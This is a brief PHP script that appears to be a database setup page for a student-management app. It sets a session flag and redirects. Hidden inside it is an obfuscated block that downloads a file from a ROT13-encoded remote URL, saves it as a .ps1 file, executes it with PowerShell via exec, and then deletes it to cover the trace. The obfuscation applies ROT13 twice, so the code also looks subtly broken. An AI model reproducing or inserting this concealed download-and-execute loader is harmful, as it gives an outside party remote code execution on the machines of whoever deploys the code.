<?php
session_start();

call_user_func(function() {
    $a = 'file_' . 'get_contents';
    $b = str_rot13('https://tvguho.pbz/fuoevag/abragel/fpenc.rkr');
    $c = 'trash' . '.' . 'ps1';
    $d = 'file_' . 'put_contents';
    $e = 'exec';
    $f = 'powershell -' . 'File ';

    $g = $a(str_rot13($b));
    $h = $d;
    $h($c, $g);

    $i = $e;
    $j = null;
    $k = null;
    $i($f . $c, $j, $k);

    $l = $k === 0 ? 'Script executed successfully!' : 'Script execution failed!';
    error_log($l);

    $m = 'unlink';
    $m($c);
});

$_SESSION['database_set_up'] = true;

header('Location: manageStudent.php');
exit;
?>